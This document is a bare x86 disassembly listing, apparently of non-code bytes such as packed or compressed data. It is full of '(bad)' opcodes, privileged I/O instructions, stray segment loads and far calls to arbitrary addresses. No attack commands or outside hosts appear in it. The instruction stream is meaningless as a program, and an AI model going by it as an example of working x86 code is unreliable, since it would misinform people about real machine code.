  436db5:	and    BYTE PTR [edx-0x3e45a4cd],bh
  436dbb:	in     al,dx
  436dbc:	lea    ebp,[ecx]
  436dbe:	es in  eax,dx
  436dc0:	jo     0x436dd4
  436dc2:	push   esp
  436dc3:	mov    ds:0x15710183,eax
  436dc8:	sbb    edx,DWORD PTR [edi+eiz*4+0x1b]
  436dcc:	xchg   ecx,eax
  436dcd:	mov    ah,0xf9
  436dcf:	xor    al,0x9c
  436dd1:	push   edx
  436dd2:	bound  esi,QWORD PTR [eax-0x26f5e60c]
  436dd8:	outs   dx,BYTE PTR ds:[esi]
  436dd9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  436dda:	cld    
  436ddb:	pop    ss
  436ddc:	sbb    DWORD PTR [ebp+0x60f052ee],0x9bb7d540
  436de6:	mov    eax,ds:0x80d7d15
  436deb:	mov    WORD PTR [eax-0x66440a35],ss
  436df1:	jne    0x436dea
  436df3:	icebp  
  436df4:	ss scas al,BYTE PTR es:[edi]
  436df6:	push   0x5a
  436df8:	xor    eax,0x5e09e477
  436dfd:	imul   dh
  436dff:	lods   eax,DWORD PTR ds:[esi]
  436e00:	ins    DWORD PTR es:[edi],dx
  436e01:	retf   
  436e02:	cli    
  436e03:	test   BYTE PTR [edi-0x76b9e9bd],ah
  436e09:	ror    ah,1
  436e0b:	jo     0x436e56
  436e0d:	xchg   ebx,eax
  436e0e:	push   cs
  436e0f:	ss aaa 
  436e11:	cmovae esp,DWORD PTR [ecx-0x3]
  436e15:	or     bl,0x8
  436e18:	and    eax,0xe226450e
  436e1d:	je     0x436dab
  436e1f:	push   edx
  436e20:	stc    
  436e21:	out    dx,eax
  436e22:	push   eax
  436e23:	xor    al,0x39
  436e25:	jns    0x436e75
  436e27:	outs   dx,DWORD PTR ds:[esi]
  436e28:	add    al,0xc2
  436e2a:	aad    0xad
  436e2c:	or     bl,BYTE PTR [esi-0x2a]
  436e2f:	mov    ebp,0x242ff8c0
  436e34:	xlat   BYTE PTR ds:[ebx]
  436e35:	or     eax,0xfaf8b80b
  436e3a:	cdq    
  436e3b:	mov    al,0x93
  436e3d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  436e3e:	leave  
  436e3f:	add    ebp,DWORD PTR [ebx]
  436e41:	mov    ss,WORD PTR [edx+0x6e7c2444]
  436e47:	js     0x436df8
  436e49:	dec    esp
  436e4a:	in     al,0xc8
  436e4c:	or     al,0x13
  436e4e:	(bad)  
  436e4f:	imul   ebp,DWORD PTR [edi+0x68],0xd245fb16
  436e56:	push   es
  436e57:	ret    0x307f
  436e5a:	cmp    ebp,DWORD PTR [edi-0x39]
  436e5d:	lods   al,BYTE PTR ds:[esi]
  436e5e:	jmp    0x436ea8
  436e60:	sub    DWORD PTR [eax-0x29d62d8f],esp
  436e66:	lds    eax,FWORD PTR [ebx-0x69]
  436e69:	hlt    
  436e6a:	and    dh,BYTE PTR [ecx]
  436e6c:	add    dl,bl
  436e6e:	jnp    0x436df5
  436e70:	cmp    eax,0xd747b34c
  436e75:	xor    eax,0x377cd8a9
  436e7a:	mov    BYTE PTR [ebp+eiz*8+0x39d85c07],cl
  436e81:	std    
  436e82:	les    edx,FWORD PTR [eax+0x61f33e3e]
  436e88:	jno    0x436e93
  436e8a:	repnz (bad) 
  436e8c:	mov    DWORD PTR [edi],esp
  436e8e:	xchg   BYTE PTR [ecx-0x22f4736c],dh
  436e94:	fwait
  436e95:	pop    edi
  436e96:	mov    ?,WORD PTR [edi+ebp*1-0x3f7a893f]
  436e9d:	pop    esi
  436e9e:	pop    es
  436e9f:	jg     0x436f00
  436ea1:	shl    ebx,cl
  436ea3:	push   0x5b
  436ea5:	iret   
  436ea6:	(bad)  
  436ea8:	int3   
  436ea9:	fstp   QWORD PTR [edx-0x62cbf981]
  436eaf:	aaa    
  436eb0:	inc    BYTE PTR [edi]
  436eb2:	adc    dl,BYTE PTR [ecx-0x6bdb0f0d]
  436eb8:	jns    0x436ec0
  436eba:	icebp  
  436ebb:	stc    
  436ebc:	test   BYTE PTR [esi-0x41],dh
  436ebf:	stos   BYTE PTR es:[edi],al
  436ec0:	sub    BYTE PTR gs:[edi-0x49f06a35],bh
  436ec7:	test   dl,al
  436ec9:	push   ebx
  436eca:	(bad)  
  436ecb:	or     bl,ch
  436ecd:	add    bh,BYTE PTR [esi]
  436ecf:	dec    esi
  436ed0:	mov    dl,0x9
  436ed2:	aad    0x70
  436ed4:	pop    es
  436ed5:	jl     0x436ec1
  436ed7:	mov    ecx,0x90e97cca
  436edc:	add    BYTE PTR [esi-0x2b9f14b0],ch
  436ee2:	mul    DWORD PTR [esi-0x8]
  436ee5:	fadd   DWORD PTR [ecx]
  436ee7:	adc    eax,0x64205dd3
  436eec:	iret   
  436eed:	jb     0x436f11
  436eef:	inc    esp
  436ef0:	cmp    BYTE PTR [ebp-0x475a55d4],ah
  436ef6:	mov    bl,0x78
  436ef8:	pop    ds
  436ef9:	sbb    esp,DWORD PTR [ebx+0x3c]
  436efc:	jb     0x436f3b
  436efe:	into   
  436eff:	(bad)  
  436f00:	sbb    eax,0xd75709f3
  436f05:	adc    ecx,ecx
  436f07:	hlt    
  436f08:	iret   
  436f09:	xchg   edi,eax
  436f0a:	jp     0x436f08
  436f0c:	cmp    edi,ebx
  436f0e:	add    dh,BYTE PTR [edi+ebp*2+0x6296275b]
  436f15:	mov    al,ds:0x58c8ca1b
  436f1a:	ror    dl,cl
  436f1c:	and    DWORD PTR [esi+eax*4],esi
  436f1f:	pop    ebx
  436f20:	mov    esp,0x21c9bfa
  436f25:	xor    ax,dx
  436f28:	inc    eax
  436f29:	or     BYTE PTR [ecx],bh
  436f2b:	pop    ecx
  436f2c:	(bad)  
  436f2d:	fcomp  st(3)
  436f2f:	lds    edx,FWORD PTR gs:[eax-0x989c7e2]
  436f36:	and    esp,DWORD PTR [ebp-0x57]
  436f39:	inc    ebp
  436f3a:	clc    
  436f3b:	mov    edx,0x653d9663
  436f40:	or     dl,bh
  436f42:	adc    al,0x6b
  436f44:	push   0xd7a4bf8c
  436f49:	mov    ecx,0xd1a7ecac
  436f4e:	xchg   BYTE PTR [eax-0x5],dh
  436f51:	cmp    al,0xfd
  436f53:	pusha  
  436f54:	mov    WORD PTR [edx-0x6f],fs
  436f57:	lea    ebp,[ecx+eiz*1-0x32]
  436f5b:	das    
  436f5c:	stos   DWORD PTR es:[edi],eax
  436f5d:	loop   0x436fcb
  436f5f:	or     al,0x8d
  436f61:	mov    cl,0x82
  436f63:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  436f64:	aad    0x3a
  436f66:	add    BYTE PTR [ecx+0x24],ah
  436f69:	pop    edi
  436f6a:	cdq    
  436f6b:	dec    DWORD PTR [esp+ebx*4]
  436f6e:	cmp    eax,0x3c0bc1da
  436f73:	mov    bh,0xb6
  436f75:	ss push ecx
  436f77:	xor    dh,BYTE PTR [ecx]
  436f79:	add    cl,BYTE PTR [ebx+ebx*4+0x61]
  436f7d:	cmp    DWORD PTR [ebx+0x7ac9927],eax
  436f83:	mov    BYTE PTR [ebx+0x2ca7625d],bh
  436f89:	mov    DWORD PTR [edi],ecx
  436f8b:	inc    ebp
  436f8c:	pop    edi
  436f8d:	repnz ins BYTE PTR es:[edi],dx
  436f8f:	inc    ecx
  436f90:	enter  0x4677,0x74
  436f94:	push   ecx
  436f95:	push   0xffffffc5
  436f97:	jg     0x436fc1
  436f99:	dec    ebp
  436f9a:	js     0x436fea
  436f9c:	ret    
  436f9d:	fstp   DWORD PTR [esi]
  436f9f:	in     eax,0x8f
  436fa1:	push   ebp
  436fa2:	sbb    DWORD PTR [ecx-0x48],esp
  436fa5:	sub    BYTE PTR [eax],0x34
  436fa8:	mov    al,0xd0
  436faa:	(bad)  
  436fab:	out    0x29,eax
  436fad:	pop    ds
  436fae:	ja     0x437024
  436fb0:	push   ebp
  436fb1:	mov    dl,0x84
  436fb3:	and    cl,dh
  436fb5:	mov    al,ds:0xa220f2da
  436fba:	pusha  
  436fbb:	js     0x436fd5
  436fbd:	cmp    eax,ebx
  436fbf:	push   ebp
  436fc0:	test   BYTE PTR [edi],dl
  436fc2:	out    dx,eax
  436fc3:	adc    eax,0x6ef21e3
  436fc8:	enter  0xc21b,0x69
  436fcc:	cmp    DWORD PTR [edi-0x5e],esi
  436fcf:	jne    0x436f58
  436fd1:	inc    edx
  436fd2:	add    bl,BYTE PTR [edi+0x608fba5c]
  436fd8:	iret   
  436fd9:	fadd   QWORD PTR [ebx+0x78428cf4]
  436fdf:	push   edx
  436fe0:	cli    
  436fe1:	(bad)  
  436fe2:	fistp  DWORD PTR [edx+0x65]
  436fe5:	pop    ebx
  436fe6:	xchg   ecx,eax
  436fe7:	ret    
  436fe8:	jg     0x436f86
  436fea:	and    al,0x29
  436fec:	lock pop edi
  436fee:	addr16 (bad) 
  436ff1:	xchg   bh,dh
  436ff3:	xchg   edi,eax
  436ff4:	pop    ebp
  436ff5:	pop    eax
  436ff6:	or     al,0x9a
  436ff8:	leave  
  436ff9:	sub    BYTE PTR [ebx],ah
  436ffb:	push   0xebeb27b9
  437000:	std    
  437001:	xchg   edi,eax
  437002:	test   eax,0xc967fcde
  437007:	addr16 arpl si,bp
  43700a:	or     BYTE PTR [esi],0x4
  43700d:	mov    cl,BYTE PTR [edx-0x1ede7b69]
  437013:	nop
  437014:	xchg   ebx,eax
  437015:	out    0x1e,al
  437017:	add    edx,DWORD PTR [esi]
  437019:	fs aaa 
  43701b:	adc    bl,BYTE PTR [ebp-0x10a06309]
  437021:	popa   
  437022:	sbb    esp,DWORD PTR [eax-0x17]
  437025:	rcr    BYTE PTR [edx],cl
  437027:	in     al,dx
  437028:	ins    DWORD PTR es:[edi],dx
  437029:	mov    ch,0xb8
  43702b:	xlat   BYTE PTR ds:[ebx]
  43702c:	mov    bl,0xd2
  43702e:	out    0x63,eax
  437030:	ja     0x437090
  437032:	mov    ds:0xe234b48,al
  437037:	xchg   ebx,eax
  437038:	add    esp,DWORD PTR [edi+ebx*2-0x45b63337]
  43703f:	inc    esp
  437040:	lods   eax,DWORD PTR ds:[esi]
  437041:	xchg   ebx,eax
  437042:	sbb    al,0x82
  437044:	fistp  WORD PTR [esi+0x2]
  437047:	std    
  437048:	xchg   edi,eax
  437049:	icebp  
  43704a:	sub    ebp,esi
  43704c:	dec    ecx
  43704d:	jmp    0x43704e
  43704f:	cli    
  437050:	jmp    0x437059
  437052:	cmp    DWORD PTR [ebp+0x21],esp
  437055:	mov    al,0xf8
  437057:	dec    edx
  437058:	daa    
  437059:	adc    BYTE PTR [edi+0x1b7f061b],0x3a
  437060:	mov    dl,0x2c
  437062:	adc    al,0xfe
  437064:	neg    DWORD PTR ds:0x2562a4a6
  43706a:	daa    
  43706b:	(bad)  
  43706c:	ror    BYTE PTR [ebx-0x2eb834e6],cl
  437072:	pop    eax
  437073:	add    BYTE PTR [ecx],0xb7
  437076:	iret   
  437077:	xchg   esi,eax
  437078:	jno    0x4370d9
  43707a:	ficomp DWORD PTR [ebp-0x32052fef]
  437080:	xlat   BYTE PTR ds:[ebx]
  437081:	and    edi,esi
  437083:	xor    eax,0xfd37570a
  437088:	aas    
  437089:	shl    DWORD PTR [ebp+0x40],1
  43708c:	stc    
  43708d:	sbb    BYTE PTR [esi+0x469f251],0xc5
  437094:	and    bh,dl
  437096:	jle    0x43707c
  437098:	inc    eax
  437099:	dec    ebp
  43709a:	sbb    ecx,DWORD PTR [ecx+ecx*1-0x29b1cc80]
  4370a1:	or     eax,0x9d7f9fa7
  4370a6:	jae    0x4370f0
  4370a8:	xor    eax,0xf68a3b5b
  4370ad:	inc    edx
  4370ae:	pop    es
  4370af:	enter  0xfc01,0xdd
  4370b3:	retf   
  4370b4:	and    WORD PTR [edx+ebp*1+0x22],0xfffc
  4370ba:	adc    esi,edx
  4370bc:	mul    BYTE PTR [ebp+0x5c]
  4370bf:	add    eax,0x9b985e12
  4370c4:	dec    esp
  4370c5:	int    0xb6
  4370c7:	in     al,0x55
  4370c9:	cmc    
  4370ca:	dec    esi
  4370cb:	call   0xb250:0x749abc31
  4370d2:	pop    ss
  4370d3:	push   ss
  4370d4:	mov    ds:0x7363325d,eax
  4370d9:	(bad)  
  4370da:	pop    ds
  4370db:	pop    ecx
  4370dc:	arpl   WORD PTR [edi],di
  4370de:	pop    ebp
  4370df:	lods   al,BYTE PTR ds:[esi]
  4370e0:	bound  esp,QWORD PTR [edx+eax*2-0x183487f5]
  4370e7:	ret    
  4370e8:	push   cs
  4370e9:	xor    BYTE PTR [esi+eiz*4-0xf],dh
  4370ed:	cmp    DWORD PTR [eax],ebp
  4370ef:	cmc    
  4370f0:	test   edx,esp
  4370f2:	call   0x2b04c01f
  4370f7:	aad    0x49
  4370f9:	mov    ecx,0x2b83348a
  4370fe:	pushf  
  4370ff:	adc    DWORD PTR [edx],0x2b
  437102:	xlat   BYTE PTR ds:[ebx]
  437103:	adc    dl,dh
  437105:	add    al,0x7c
  437107:	inc    ecx
  437108:	cwde   
  437109:	add    bh,ah
  43710b:	lods   al,BYTE PTR ds:[esi]
  43710c:	rcr    DWORD PTR [ebx-0x2c],1
  43710f:	mov    ebp,DWORD PTR [edi+0x5c332e08]
  437115:	xchg   edx,eax
  437116:	pop    ecx
  437117:	mov    ebx,0xc5390769
  43711c:	call   0xb1fb677d
  437121:	or     DWORD PTR [eax],0xb8b539c4
  437127:	in     al,dx
  437128:	fisubr WORD PTR [ebx]
  43712a:	push   0x17acab7a
  43712f:	pop    esp
  437130:	adc    ecx,DWORD PTR [ebx+0x4d677525]
  437136:	pop    ebx
  437137:	adc    DWORD PTR [edi-0x722d2ad8],ebp
  43713d:	jp     0x4370bf
  43713f:	stc    
  437140:	xchg   esp,eax
  437141:	inc    edx
  437142:	mov    ds:0x2097d1b6,eax
  437147:	push   cs
  437148:	pop    es
  437149:	mov    al,0x54
  43714b:	cld    
  43714c:	or     al,0x99
  43714e:	or     eax,0x1d03812c
  437153:	in     eax,dx
  437154:	cmp    BYTE PTR [edi-0x6e2bc94d],dl
  43715a:	sub    ebp,edx
  43715c:	iret   
  43715d:	fs or  al,0xb5
  437160:	and    DWORD PTR [esi-0x6d],ecx
  437163:	aaa    
  437164:	jg     0x437171
  437166:	stos   DWORD PTR es:[edi],eax
  437167:	jae    0x437109
  437169:	call   0x725f9c10
  43716e:	scas   eax,DWORD PTR es:[edi]
  43716f:	mov    cl,0x68
  437171:	loope  0x4371e5
  437173:	mov    BYTE PTR [edi+ebp*4-0x7c4285b5],bh
  43717a:	dec    ebp
  43717b:	dec    esp
  43717c:	and    al,0x1
  43717e:	leave  
  43717f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  437180:	mov    al,ds:0x53cd6dfa
  437185:	sbb    esi,edx
  437187:	gs push ss
  437189:	xchg   ebp,eax
  43718a:	clc    
  43718b:	mov    esi,DWORD PTR [ecx-0x56]
  43718e:	xor    al,0xa0
  437190:	push   0xffffff9c
  437192:	mov    ecx,0x71e24d
  437197:	retf   0x404d
  43719a:	(bad)  [edx+edx*1+0xecb77b7]
  4371a1:	nop
  4371a2:	xor    BYTE PTR [ebp-0x4],ah
  4371a5:	je     0x437135
  4371a7:	pop    ebp
  4371a8:	xor    bh,bh
  4371aa:	cli    
  4371ab:	pop    ecx
  4371ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4371ad:	imul   BYTE PTR [esi-0x69115f70]
  4371b3:	jmp    0x36d5357b
  4371b8:	mov    esi,0x2268e223
  4371bd:	test   al,0x1e
  4371bf:	mov    eax,ds:0x730d8355
  4371c4:	(bad)  
  4371c5:	imul   ebp,DWORD PTR [ecx+0x74],0xffffffe0
  4371c9:	push   eax
  4371ca:	scas   al,BYTE PTR es:[edi]
  4371cb:	jb     0x4371f4
  4371cd:	jbe    0x437192
  4371cf:	sbb    ecx,DWORD PTR ds:0x71e8fdf2
  4371d5:	xchg   edx,eax
  4371d6:	or     BYTE PTR [esi-0x77],0x80
  4371da:	out    dx,eax
  4371db:	addr16 in al,dx
  4371dd:	pop    esi
  4371de:	or     BYTE PTR ds:0xd9cbc978,ah
  4371e4:	jno    0x4371f9
  4371e6:	add    esi,edx
  4371e8:	fwait
  4371e9:	and    dh,0xe7
  4371ec:	lea    edi,[esp+ebx*8]
  4371ef:	(bad)  
  4371f1:	xlat   BYTE PTR ds:[ebx]
  4371f2:	mov    al,ds:0x2d1e05ed
  4371f7:	mov    eax,0xa3ee0a66
  4371fc:	(bad)  
  4371fe:	test   al,0xf6
  437200:	mov    esp,0xfbdc5b8e
  437205:	ror    DWORD PTR [eax],cl
  437207:	pop    esp
  437208:	xor    esi,DWORD PTR [ecx+0x23093b7a]
  43720e:	mov    esi,0x9be7412b
  437213:	dec    ebp
  437214:	cwde   
  437215:	sbb    eax,0x2148694b
  43721a:	rcl    ah,1
  43721c:	scas   al,BYTE PTR es:[edi]
  43721d:	xor    al,0x4a
  43721f:	jmp    0xf237e5e1
  437224:	mov    cl,0xd0
  437226:	scas   eax,DWORD PTR es:[edi]
  437227:	fcomp  QWORD PTR [esi+0x30]
  43722a:	sbb    eax,0x7768dce0
  43722f:	gs int3 
  437231:	xlat   BYTE PTR ds:[ebx]
  437232:	push   esp
  437233:	dec    esp
  437234:	or     edi,ecx
  437236:	sbb    ch,BYTE PTR [ebx]
  437238:	or     al,0xe0
  43723a:	or     BYTE PTR [edx+0x661716fe],0xb0
  437241:	push   es
  437242:	fdiv   st(3),st
  437244:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  437245:	cmc    
  437246:	push   ss
  437247:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  437249:	into   
  43724a:	bound  eax,QWORD PTR [edx+ebx*2]
  43724d:	xor    al,0xba
  43724f:	les    ecx,FWORD PTR ds:[esi+0x4d]
  437253:	(bad)  
  437254:	sub    al,0x62
  437256:	cmc    
  437257:	stos   BYTE PTR es:[edi],al
  437258:	aas    
  437259:	cli    
  43725a:	dec    esi
  43725b:	call   0xcb89:0x4d69c218
  437262:	sbb    BYTE PTR [ebx-0x1d],al
  437265:	jp     0x437297
  437267:	idiv   BYTE PTR [ebx+0x2e]
  43726a:	frstor [eax]
  43726c:	popa   
  43726d:	pop    es
  43726e:	add    al,0x8a
  437270:	std    
  437271:	mov    dh,0x82
  437273:	inc    ebp
  437274:	jmp    0x437255
  437276:	xchg   ebx,eax
  437277:	sub    eax,DWORD PTR [edx]
  437279:	fnsave [ecx]
  43727b:	inc    edx
  43727c:	mov    esp,0x11a96804
  437281:	xchg   bh,bh
  437283:	or     DWORD PTR [ecx-0x80],esp
  437286:	mov    ecx,0x8fbfa5e1
  43728b:	cmp    eax,0xe34e9fbb
  437290:	retf   0x3cae
  437293:	sub    BYTE PTR [esi-0x47584a8b],bl
  437299:	imul   ebx,DWORD PTR [edi-0xa],0xffffff86
  43729d:	test   al,0xe8
  43729f:	pop    esi
  4372a0:	fmul   QWORD PTR [edi]
  4372a2:	call   0xa59039b8
  4372a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4372a8:	loopne 0x4372e0
  4372aa:	(bad)  [eax-0x6f]
  4372ad:	xchg   edx,eax
  4372ae:	pop    ds
  4372af:	call   0xa9dbd96b
  4372b4:	mov    eax,ds:0xd81e5797
  4372b9:	inc    edx
  4372ba:	push   0x4d47de9c
  4372bf:	shl    DWORD PTR ds:0x50aea5fe,cl
  4372c5:	std    
  4372c6:	jnp    0x437311
  4372c8:	mov    al,0xe1
  4372ca:	std    
  4372cb:	or     edx,ebp
  4372cd:	jo     0x437287
  4372cf:	addr16 push esi
  4372d1:	mov    ecx,0xf0381c98
  4372d6:	pop    es
  4372d7:	xor    bh,BYTE PTR [ebx]
  4372d9:	push   esi
  4372da:	sbb    edx,DWORD PTR [ecx]
  4372dc:	(bad)  
  4372dd:	addr16 pop edx
  4372df:	mov    BYTE PTR [eax-0x291a3566],ch
  4372e5:	mov    ch,0xf9
  4372e7:	adc    eax,0x98f37764
  4372ec:	call   0xd4d401f9
  4372f1:	fsubr  QWORD PTR ds:0xbb177812
  4372f7:	lods   eax,DWORD PTR ds:[esi]
  4372f8:	or     al,0x9c
  4372fa:	inc    eax
  4372fb:	ss fwait
  4372fd:	and    eax,0x7e6fbb0e
  437302:	pop    ss
  437303:	adc    al,0xc2
  437305:	jp     0x4372fb
  437307:	push   ebp
  437308:	and    bh,BYTE PTR [ebx]
  43730a:	(bad)  
  43730b:	and    DWORD PTR [eax-0x46c1a841],ebp
  437311:	test   BYTE PTR [ecx+0x30f7b216],al
  437317:	mov    WORD PTR fs:[edi],?
  43731a:	rcl    DWORD PTR [esi],0x62
  43731d:	mov    cl,0x4b
  43731f:	cmp    edi,DWORD PTR [edx+0x75]
  437322:	and    esi,DWORD PTR [ebx-0x563a5270]
  437328:	out    dx,eax
  437329:	dec    ecx
  43732a:	mov    ds:0x94926d6e,eax
  43732f:	ins    BYTE PTR es:[edi],dx
  437330:	repz xor al,0x88
  437333:	ficom  WORD PTR [ebx]
  437335:	loop   0x43736c
  437337:	repz mov esp,0xf52bf481
  43733d:	imul   esp,ecx,0x8c337f16
  437343:	inc    ecx
  437344:	mov    ch,0x26
  437346:	adc    al,0xf4
  437348:	cli    
  437349:	popf   
  43734a:	jmp    0xf66de299
  43734f:	out    dx,eax
  437350:	mov    dl,ch
  437352:	sbb    eax,0x1855e5e2
  437357:	push   ebp
  437358:	outs   dx,DWORD PTR ds:[esi]
  437359:	ret    0xe07c
  43735c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43735d:	aad    0x23
  43735f:	xchg   esp,eax
  437360:	mov    ecx,0xa8ed8a5b
  437365:	call   0xdcee:0xd5343b18
  43736c:	inc    eax
  43736d:	push   esp
  43736e:	inc    ebx
  43736f:	jl     0x437379
  437371:	add    esi,DWORD PTR [eax-0x4e]
  437374:	sahf   
  437375:	addr16 push ds
  437377:	das    
  437378:	mov    eax,DWORD PTR [ecx-0x6923efc1]
  43737e:	dec    ebp
  43737f:	addr16 mov ch,0xf2
  437382:	(bad)  
  437383:	push   esi
  437384:	inc    edi
  437385:	mov    eax,0xa17861ed
  43738a:	xchg   DWORD PTR [eax],edi
  43738c:	loop   0x437406
  43738e:	mov    ecx,0xa26a46cb
  437393:	fcmovne st,st(2)
  437395:	add    cl,BYTE PTR [ecx]
  437397:	dec    esi
  437398:	stc    
  437399:	add    edi,ebp
  43739b:	fistp  WORD PTR [eax+0x41]
  43739e:	sahf   
  43739f:	jge    0x295e9062
  4373a5:	das    
  4373a6:	lds    esp,FWORD PTR [ebp+0x2c]
  4373a9:	div    DWORD PTR [eax]
  4373ab:	sbb    al,0x1b
  4373ad:	jecxz  0x4373db
  4373af:	dec    ebp
  4373b0:	enter  0x40bc,0x21
  4373b4:	ret    
  4373b5:	imul   DWORD PTR [ecx-0xd]
  4373b8:	je     0x43733c
  4373ba:	daa    
  4373bb:	out    dx,eax
  4373bc:	fwait
  4373bd:	add    cl,BYTE PTR [ebx+0x7e]
  4373c0:	ret    0x5d63
  4373c3:	mov    bl,0x50
  4373c5:	imul   ebp,DWORD PTR [ecx+0x46],0xfffffff9
  4373c9:	adc    al,0x4
  4373cb:	test   BYTE PTR [ebx+0x77],bl
  4373ce:	jg     0x437384
  4373d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4373d1:	sbb    DWORD PTR [esi+edi*8-0x4e38a4dc],esp
  4373d8:	adc    al,0xa3
  4373da:	dec    ebx
  4373db:	and    eax,0xdd0faed1
  4373e0:	ins    BYTE PTR es:[edi],dx
  4373e1:	inc    edi
  4373e2:	push   edx
  4373e3:	mov    edi,DWORD PTR [esi+ecx*1-0x3ab33752]
  4373ea:	ret    
  4373eb:	inc    esi
  4373ec:	lods   eax,DWORD PTR ds:[esi]
  4373ed:	push   eax
  4373ee:	ss ins DWORD PTR es:[edi],dx
  4373f0:	sub    eax,0xbe614ea3
  4373f5:	sahf   
  4373f6:	shr    DWORD PTR [eax],0x39
  4373f9:	aad    0x5b
  4373fb:	out    dx,al
  4373fc:	ins    DWORD PTR es:[edi],dx
  4373fd:	xchg   ecx,eax
  4373fe:	jbe    0x437408
  437400:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  437401:	xchg   ebp,eax
  437402:	mov    eax,0x808bfe49
  437407:	lahf   
  437408:	ds cli 
  43740a:	stos   BYTE PTR es:[edi],al
  43740b:	add    eax,ecx
  43740d:	lock (bad) 
  43740f:	jns    0x4373ba
  437411:	pop    es
  437412:	pop    ebx
  437413:	retf   
  437414:	vpaddd xmm6,xmm2,XMMWORD PTR [edi+edi*2+0x7e7f86e4]
  43741d:	inc    edi
  43741e:	fild   DWORD PTR [ecx+eiz*4]
  437421:	inc    esi
  437422:	addr16 xor esi,esp
  437425:	and    ch,BYTE PTR [edx+0x63b35b9d]
  43742b:	mov    al,0x7f
  43742d:	push   edi
  43742e:	scas   al,BYTE PTR es:[edi]
  43742f:	inc    ebx
  437430:	enter  0x6f11,0xf6
  437434:	jecxz  0x4373f3
  437436:	and    eax,0x25cb186d
  43743b:	aam    0x63
  43743d:	add    eax,0xf9ba514e
  437442:	ret    0xfc43
  437445:	inc    ebx
  437446:	xchg   edx,eax
  437447:	jb     0x4373e4
  437449:	sbb    ecx,edi
  43744b:	iret   
  43744c:	ficomp DWORD PTR ds:0x62ac2754
  437452:	jmp    0x4374b6
  437454:	out    dx,al
  437455:	mov    ss,esp
  437457:	(bad)  
  437458:	(bad)  
  437459:	push   edx
  43745a:	scas   al,BYTE PTR es:[edi]
  43745b:	cdq    
  43745c:	pop    edi
  43745d:	xor    DWORD PTR [esi-0x2c],eax
  437460:	sub    BYTE PTR [ecx-0x59d5bb98],cl
  437466:	sti    
  437467:	push   ebp
  437468:	xor    ecx,DWORD PTR [edx+edx*1-0x33fa2944]
  43746f:	ins    DWORD PTR es:[edi],dx
  437470:	ss mov edi,0x510760e6
  437476:	ffree  st(1)
  437478:	mov    eax,ds:0x9c2d9d77
  43747d:	cmp    al,0x32
  43747f:	js     0x4374b4
  437481:	cmp    eax,0x9376a797
  437486:	mov    bh,0x8b
  437488:	adc    eax,0x97bac283
  43748d:	mov    edi,0x12fb6c27
  437492:	xlat   BYTE PTR ds:[ebx]
  437493:	repz cmp bl,BYTE PTR [eax+0x11]
  437497:	repnz popa 
  437499:	out    dx,eax
  43749a:	cmc    
  43749b:	pop    ds
  43749c:	ins    DWORD PTR es:[edi],dx
  43749d:	sub    al,BYTE PTR [ebx+ebx*4]
  4374a0:	jns    0x4374ec
  4374a2:	out    0x65,eax
  4374a4:	inc    ebp
  4374a5:	sub    DWORD PTR [ebx],esi
  4374a7:	ret    
  4374a8:	xor    ebx,ebx
  4374aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4374ab:	jl     0x4374ad
  4374ad:	adc    WORD PTR [eax-0x5a8cee41],bp
  4374b4:	das    
  4374b5:	sti    
  4374b6:	ds push ebx
  4374b8:	mov    ds:0xde19f6f7,eax
  4374bd:	fucomp st(1)
  4374bf:	adc    BYTE PTR [esi+0x27],ch
  4374c2:	sub    eax,0x46ff675
  4374c7:	inc    ebp
  4374c8:	sub    eax,0x4c6f55e1
  4374cd:	add    al,0xff
  4374cf:	or     eax,0x20b0de17
  4374d4:	push   0xece8e382
  4374d9:	ins    BYTE PTR es:[edi],dx
  4374da:	(bad)  
  4374db:	mov    eax,0x8c06082c
  4374e0:	add    eax,0x45c0036e
  4374e5:	mov    ch,0xf4
  4374e7:	daa    
  4374e8:	cmp    al,0x5
  4374ea:	dec    ecx
  4374eb:	pop    esi
  4374ec:	or     eax,0xce5520ed
  4374f1:	clc    
  4374f2:	add    DWORD PTR [edi+0x7890e464],0xf995c949
  4374fc:	je     0x43749f
  4374fe:	mov    dh,0x8c
  437500:	lods   al,BYTE PTR ds:[esi]
  437501:	mov    al,0xc3
  437503:	clc    
  437504:	fdivr  QWORD PTR [ecx-0x63]
  437507:	jo     0x437566
  437509:	mov    gs,edi
  43750b:	stos   DWORD PTR es:[edi],eax
  43750c:	jb     0x43754b
  43750e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43750f:	in     eax,dx
  437510:	ficom  WORD PTR [eax]
  437512:	data16 xchg BYTE PTR [edi],cl
  437515:	push   0xd0619841
  43751a:	adc    DWORD PTR [edx+0x3e290997],esp
  437520:	inc    edi
  437521:	sub    cl,dl
  437523:	cli    
  437524:	nop
  437525:	inc    esi
  437526:	mov    DWORD PTR [eax+0x22],esp
  437529:	cmp    eax,0xc303b143
  43752e:	dec    esp
  43752f:	xor    BYTE PTR [edx],bh
  437531:	xchg   BYTE PTR [edi],dl
  437533:	or     DWORD PTR [edx+edi*2+0x10],ebx
  437537:	pop    edi
  437538:	int3   
  437539:	dec    edx
  43753a:	jae    0x4374c4
  43753c:	mov    eax,ds:0xa25d81a5
  437541:	inc    edi
  437542:	enter  0x2381,0xd7
  437546:	mov    ch,0x30
  437548:	fcmovnbe st,st(7)
  43754a:	lock outs dx,BYTE PTR ds:[esi]
  43754c:	loop   0x437532
  43754e:	retf   
  43754f:	loope  0x4374f1
  437551:	xchg   edi,eax
  437552:	sub    eax,DWORD PTR [ecx+0x3a]
  437555:	jl     0x4375cc
  437557:	sub    al,0x1c
  437559:	clc    
  43755a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43755b:	rcr    DWORD PTR [edx],0xe2
  43755e:	pop    ebp
  43755f:	inc    ecx
  437560:	pop    esi
  437561:	push   edi
  437562:	popa   
  437563:	cmp    BYTE PTR [esi-0x63],ch
  437566:	shr    DWORD PTR [edx+0x46],1
  437569:	dec    ebx
